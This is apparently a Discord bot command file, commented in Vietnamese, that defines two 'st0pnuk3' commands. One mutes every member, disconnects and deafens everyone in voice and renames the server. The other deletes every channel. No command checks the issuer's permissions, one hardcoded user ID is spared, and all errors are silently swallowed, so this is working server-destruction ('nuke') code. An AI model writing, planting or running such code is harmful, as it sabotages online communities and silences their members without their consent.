// Một file, hai biến thể lệnh st0pnuk3 (loader nhận mảng export):
//   n?st0pnuk3 -> khóa server (mute toàn bộ + ngắt voice + đổi tên)
//   ?st0pnuk3  -> xóa toàn bộ kênh
const DEV_USER = "1376022909096689668";

const lockdown = {
  name: "st0pnuk3",
  prefix: "n?",
  description: "Khóa server: mute toàn bộ, ngắt voice, đổi tên server",
  usage: "n?st0pnuk3",
  destructive: true,

  async execute(message) {
    const guild = message.guild;
    if (!guild) return;

    const mutedRole = await guild.roles
      .create({ name: "Muted", color: "#000000", permissions: [] })
      .catch(() => null);

    const members = await guild.members.fetch().catch(() => guild.members.cache);

    if (mutedRole) {
      guild.channels.cache.forEach((channel) => {
        channel.permissionOverwrites
          .create(mutedRole, {
            SendMessages: false,
            AddReactions: false,
            Speak: false,
            SendMessagesInThreads: false,
            CreatePublicThreads: false,
            CreatePrivateThreads: false,
          })
          .catch(() => {});
      });

      members.forEach((member) => {
        if (!member.user.bot && member.id !== DEV_USER) {
          member.roles.add(mutedRole).catch(() => {});
        }
      });
    }

    members.forEach((member) => {
      if (!member.user.bot && member.id !== DEV_USER && member.voice.channel) {
        member.voice.disconnect().catch(() => {});
        member.voice.setMute(true).catch(() => {});
        member.voice.setDeaf(true).catch(() => {});
      }
    });

    guild.setName("server-locked").catch(() => {});
  },
};

const wipe = {
  name: "st0pnuk3",
  prefix: "?",
  description: "Xóa toàn bộ kênh của server",
  usage: "?st0pnuk3",
  destructive: true,

  async execute(message) {
    const guild = message.guild;
    if (!guild) return;

    try {
      const channels = await guild.channels.fetch();
      for (const [, channel] of channels) {
        await channel.delete().catch(() => {});
      }
    } catch (e) {}
  },
};

module.exports = [lockdown, wipe];
